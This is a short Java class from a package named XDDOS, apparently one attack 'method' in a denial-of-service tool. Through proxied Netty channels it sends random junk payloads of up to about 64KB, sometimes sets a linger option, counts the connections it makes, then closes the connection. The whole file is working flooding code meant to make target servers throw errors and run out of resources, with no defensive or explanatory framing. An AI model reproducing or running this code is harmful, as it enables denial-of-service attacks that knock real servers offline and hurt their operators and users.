package XD.XDDOS.methods;

import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelOption;
import io.netty.util.internal.ThreadLocalRandom;

public class RandomExceptions 
implements Method{

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        byte[] bytes = new byte[5 + ThreadLocalRandom.current().nextInt(65534)];
        ThreadLocalRandom.current().nextBytes(bytes);
        channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
        NettyBootstrap.totalConnections++;
        if (ThreadLocalRandom.current().nextBoolean()) {
          channel.config().setOption(ChannelOption.SO_LINGER, Integer.valueOf(1));
        }
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
      }
    
}
